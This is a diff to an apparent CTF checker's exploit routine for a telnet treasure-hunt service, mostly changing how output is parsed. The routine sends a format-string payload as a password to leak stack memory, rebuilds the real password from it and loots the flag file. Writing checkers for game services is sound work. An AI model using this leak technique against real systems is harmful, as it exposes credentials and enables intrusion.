@@ -143,15 +143,8 @@ async def getflag_note(
     conn.writer.write(f"dock\n".encode())
     await conn.writer.drain()
 
-# Define the flag regex pattern
-flag_regex = re.compile(r'ENOFLAG{.*?}')
-
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
-    # Ensure flag_regex is set before using it
-    if task.flag_regex is None:
-        task.flag_regex = flag_regex
-        logger.debug(f"Flag regex not set, using default: {task.flag_regex.pattern}")
 
     
     # Start the telnet session
@@ -162,9 +155,9 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     await conn.writer.drain()
     
     # Handle the output and wait for the directories listing
-    directories_output = (await conn.reader.readuntil(b"$ ")).decode().replace('\r', '').split('\n')[3:-2]
-    # Remove everything that doesn't contain exactly two capital letters
-    directories = [directory for directory in directories_output if len(re.findall(r'[A-Z]', directory)) == 2]
+    #   Excluding initial '.' and '..' and the last two (empty line and prompt)
+    directories = (await conn.reader.readuntil(b"$ ")).decode().replace('\r', '').split('\n')[2:-2]
+    # directories = [directory for directory in directories_output if len(re.findall(r'[A-Z]', directory)) == 2]
     logger.debug(f"Directories output: {directories}")
 
     treasure_dir = ""
@@ -203,16 +196,12 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     # Send the format string exploit as the password
     conn.writer.write(b'%31$llx.%32$llx\n')
     await conn.writer.drain()
-    
-    # Now, wait for the incorrect password message which includes the pattern "is incorrect!"
-    incorrect_message_pattern = re.compile(rb'(\w+)\.(\w+).*')
 
     # Read the buffer to get the incorrect password message
-    incorrect_message = await conn.reader.readuntil(incorrect_message_pattern)
+    incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()
 
-    # Extract the two addresses from the captured groups
-    address1_hex, address2_hex = incorrect_message_pattern.search(incorrect_message).groups()
-    address1_hex, address2_hex = address1_hex.decode(), address2_hex.decode()
+    # Extract the two addresses from the incorrect message
+    address1_hex, address2_hex = incorrect_message.split(',')[0].split('.')
 
     # Convert the addresses to ASCII and reverse them
     address1 = bytes.fromhex(address1_hex).decode()[::-1]
@@ -223,7 +212,6 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     logger.debug(f'Incorrect message: {incorrect_message}\nAddress 1 Hex: {address1_hex}\nAddress 2 Hex: {address2_hex}\nPassword: {password}')
 
     # Now try to plunder the file again
-    await conn.reader.readuntil(b"$ ")
     conn.writer.write(f'loot {treasure_file}\n'.encode())
     await conn.writer.drain()
     await conn.reader.readuntil(b": ")
